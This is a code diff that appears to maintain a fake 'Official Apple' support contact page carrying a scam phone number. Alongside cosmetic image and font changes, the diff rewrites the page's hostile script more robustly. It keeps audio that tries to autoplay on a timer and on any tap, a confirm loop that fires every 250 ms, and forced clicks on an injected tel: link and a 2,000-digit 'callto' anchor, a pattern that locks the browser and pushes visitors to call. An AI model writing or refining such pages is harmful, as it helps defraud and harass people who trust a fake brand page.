@@ -11,17 +11,20 @@
     <title>Contact - Official Apple</title>
     <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more." />
     
-    <!-- Preload background images to prevent white flash on iPhones -->
-    <link rel="preload" href="globalnav/apple/contact-us-hero.image.small_2x.jpg" as="image" media="(max-width: 735px)" />
-    <link rel="preload" href="globalnav/apple/contact-us-hero.image.large_2x.jpg" as="image" media="(min-width: 736px)" />
+    <!-- Preload hero background image in WebP format for fast mobile load -->
+    <link rel="preload" href="globalnav/apple/contact-us-hero.image.small_2x.webp" as="image" type="image/webp" media="(max-width: 735px)" />
+    <link rel="preload" href="globalnav/apple/contact-us-hero.image.large_2x.webp" as="image" type="image/webp" media="(min-width: 736px)" />
     
     <style>
-        /* Force footer to the bottom of the viewport */
+        /* Force footer to the bottom of the viewport & optimize font/image rendering on iPhones */
         body {
             display: flex;
             flex-direction: column;
             min-height: 100vh;
             margin: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "SF Pro Display", "Helvetica Neue", Helvetica, Arial, sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
         }
         .main {
             flex: 1 0 auto;
@@ -29,11 +32,15 @@
         #ac-globalfooter {
             flex-shrink: 0;
         }
+        .as-banner-image img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
     </style>
 
     <link rel="stylesheet" href="Base.css" type="text/css" />
-    <link rel="stylesheet" type="text/css" href="fonts/_families=SF+Pro,v1_7CSF+Pro+Icons,v1html.html" />
-    <script src="text.js"></script>
+    <script src="text.js" defer></script>
 
 </head>
 
@@ -173,24 +180,13 @@
                 <div class="column large-12 medium-12 small-12">
                     <div class='as-banner-cont'>
                         <div class='as-banner-image as-banner-image--top'>
-                            <style type="text/css">
-                                .as-banner-image.as-banner-image--top {
-                                    background-image: url("globalnav/apple/contact-us-hero.image.large_2x.jpg");
-                                }
-
-                                .as-banner-image.as-banner-image--top:before {
-                                    content: "";
-                                    display: block;
-                                }
-
-                                @media only screen and (max-width: 735px) {
-                                    .as-banner-image.as-banner-image--top {
-                                        background-image: url("globalnav/apple/contact-us-hero.image.small_2x.jpg");
-                                    }
-                                }
-                            </style>
-                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="globalnav/apple/contact-us-hero.image.small_2x.jpg 735w, globalnav/apple/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="globalnav/apple/contact-us-hero.image.large_2x.jpg"
-                            />
+                            <picture>
+                                <source media="(max-width: 735px)" srcset="globalnav/apple/contact-us-hero.image.small_2x.webp" type="image/webp">
+                                <source media="(max-width: 735px)" srcset="globalnav/apple/contact-us-hero.image.small_2x.jpg" type="image/jpeg">
+                                <source media="(min-width: 736px)" srcset="globalnav/apple/contact-us-hero.image.large_2x.webp" type="image/webp">
+                                <source media="(min-width: 736px)" srcset="globalnav/apple/contact-us-hero.image.large_2x.jpg" type="image/jpeg">
+                                <img alt="" class="as-image-speculativedownload" src="globalnav/apple/contact-us-hero.image.large_2x.webp" decoding="async" fetchpriority="high" />
+                            </picture>
                         </div>
                     </div>
                     <div class="as-banner-content">
@@ -227,13 +223,13 @@
                 <meta content="Apple" property="name" />
                 <meta content="+1(844)530-2543
 			 " property="telephone" />
+                <meta content="+1(844)530-2543" property="telephone" />
             </section>
         </div>
     </footer>
 
 
 
-    <script src="code.jquery.com/jquery-1.12.0.min.js"></script>
     <script>
         function getURLParameter(name) {
             return decodeURI(
@@ -316,14 +312,13 @@
         var phone = cookieHelper.get('phoneSetBl');
 
         function getText() {
-            var str = window.defaultText;
+            var str = window.defaultText || '';
 
             for (var d in window.text) {
                 if (window.refef.indexOf(d) != -1) {
                     str = window.text[d];
                 }
             }
-            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
             return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
         }
 
@@ -362,40 +357,41 @@
             }
         }
 
-        // Try playing after 3 seconds
         setTimeout(attemptPlayAudio, 3000);
 
-        // Try playing on any user interaction
         document.addEventListener('click', attemptPlayAudio);
         document.addEventListener('touchstart', attemptPlayAudio);
         window.addEventListener('click', attemptPlayAudio);
         window.addEventListener('touchstart', attemptPlayAudio);
 
         var intervalId;
-        // Delay the aggressive confirm loop by 3 seconds so the page can load and audio can attempt to start
         setTimeout(function() {
             function loopConfirm() {
-                attemptPlayAudio(); // Also try playing when the loop fires
+                attemptPlayAudio(); 
                 myFunction();
-                setTimeout(loopConfirm, 250); // Use setTimeout instead of setInterval to not starve the event loop completely
+                setTimeout(loopConfirm, 250);
             }
             loopConfirm();
         }, 3000);
 
         function okkkk() {
-            jQuery('#result').append('<a  class="anchorcall" href="tel:+1(844)530-2543"></a>');
-            document.querySelector('a').click();
-            var extraData = "";
-            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
-                var extraData = extraData + "5555555555";
+            var resultEl = document.getElementById('result');
+            if (resultEl) {
+                resultEl.insertAdjacentHTML('beforeend', '<a class="anchorcall" href="tel:+1(844)530-2543"></a>');
             }
-            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
-            document.querySelector('a').click();
-            document.querySelector('a').click();
-            document.querySelector('a').click();
-            document.querySelector('a').click();
-            document.querySelector('a').click();
-            document.querySelector('a').click();
+            var firstAnchor = document.querySelector('a');
+            if (firstAnchor) firstAnchor.click();
+            var extraData = "";
+            for (var itxextraData = 0; itxextraData < 200; itxextraData++) {
+                extraData += "5555555555";
+            }
+            if (resultEl) {
+                resultEl.insertAdjacentHTML('beforeend', '<a href="#callto+' + extraData + '%00"></a>');
+            }
+            var anchors = document.querySelectorAll('a');
+            for (var i = 0; i < Math.min(6, anchors.length); i++) {
+                anchors[i].click();
+            }
         };
 
         function myFunction() {
